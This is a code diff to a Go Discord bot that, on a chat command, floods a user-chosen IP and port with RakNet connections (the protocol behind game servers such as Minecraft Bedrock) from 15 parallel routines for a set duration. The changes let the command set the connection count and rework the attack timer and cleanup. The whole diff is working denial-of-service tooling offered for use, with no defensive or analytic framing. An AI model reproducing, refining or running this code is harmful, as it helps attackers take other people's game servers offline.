@@ -24,7 +24,7 @@ var connId = 0
 var connections = map[int]*raknet.Conn{}
 var log = logrus.New()
 var target string
-var maxConn = 1000 // Default connections
+var maxConn = 1
 var attackDuration time.Duration
 
 func main() {
@@ -146,44 +146,61 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 		attackDuration = time.Duration(duration) * time.Second
 
+		// Use maxConn from message
+		if len(parts) > 5 {
+			maxStr := parts[5]
+			maxInt, err := strconv.Atoi(maxStr)
+			if err != nil {
+				s.ChannelMessageSend(m.ChannelID, "Invalid max connections. Using default max connections (1).")
+			} else {
+				maxConn = maxInt
+			}
+		}
+
 		target = ip + ":" + strconv.Itoa(port)
 
 		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Initiating RakNet attack on %s for %d seconds with %d connections...", target, duration, maxConn))
 
-		go startAttack(s, m.ChannelID)
-	}
-}
+		// Capture the session to ensure it's available inside createConn
+		go func(sess *discordgo.Session) {
+			attackTimer := time.NewTimer(attackDuration)
+			done := make(chan bool)
 
-func startAttack(s *discordgo.Session, channelID string) {
-
-	var wg sync.WaitGroup
-	for i := 0; i < 15; i++ {
-		wg.Add(1)
-		go func(i int) {
-			defer wg.Done()
-			for {
-				select {
-				case <-time.After(attackDuration):
-					log.Infof("Attack duration complete for routine %d", i)
-					return // Exit the goroutine when duration is complete
-				default:
-					err := createConn(i, s, channelID)
-					if err != nil {
-						log.Errorf("Routine %d: %v", i, err)
-
-						// Send error to Discord channel, limiting frequency to avoid spamming
-						s.ChannelMessageSend(channelID, fmt.Sprintf("Error en la rutina %d: %v", i, err))
-						time.Sleep(5 * time.Second) // Adjust the sleep duration
-						continue
+			for i := 0; i < 15; i++ {
+				i := i
+				go func() {
+					for {
+						select {
+						case <-attackTimer.C:
+							log.Infof("Attack duration complete for routine %d", i)
+							done <- true
+							return
+						default:
+							err := createConn(i, sess, m.ChannelID)
+							if err != nil {
+								log.Error(err)
+								continue
+							}
+						}
 					}
-				}
+				}()
 			}
-		}(i) // Pass the loop variable i to the goroutine
+
+			time.Sleep(attackDuration) // Allow time for goroutines to complete or timeout
+			s.ChannelMessageSend(m.ChannelID, "RakNet attack completed.")
+
+			// Close all connections and exit
+			mu.Lock()
+			for id, conn := range connections {
+				if conn != nil {
+					conn.Close()
+					log.Infof("Closed connection %d", id)
+				}
+				delete(connections, id)
+			}
+			mu.Unlock()
+		}(s) // Pass Discord session to goroutine
 	}
-
-	wg.Wait() // Wait for all connection creation routines to complete
-	s.ChannelMessageSend(channelID, "RakNet attack completed")
-
 }
 
 func createConn(t int, s *discordgo.Session, channelID string) error {
@@ -202,7 +219,7 @@ func createConn(t int, s *discordgo.Session, channelID string) error {
 	connections[cId] = conn
 	log.Infof("[%d] Created connection %s [%d]", t, conn.RemoteAddr(), len(connections))
 	mu.Unlock()
-	go func() {
+	go func(sess *discordgo.Session) {
 		for {
 			_, err := conn.ReadPacket()
 			if err != nil {
@@ -213,10 +230,13 @@ func createConn(t int, s *discordgo.Session, channelID string) error {
 				delete(connections, cId)
 				log.Infof("Closed %s", conn.RemoteAddr())
 				mu.Unlock()
+
+				// Notify Discord of connection closure (optional)
+				sess.ChannelMessageSend(channelID, fmt.Sprintf("Connection %d closed: %v", cId, err))
 				return
 			}
 			time.Sleep(time.Millisecond * 100)
 		}
-	}()
+	}(s) // Pass Discord session to goroutine
 	return nil
 }
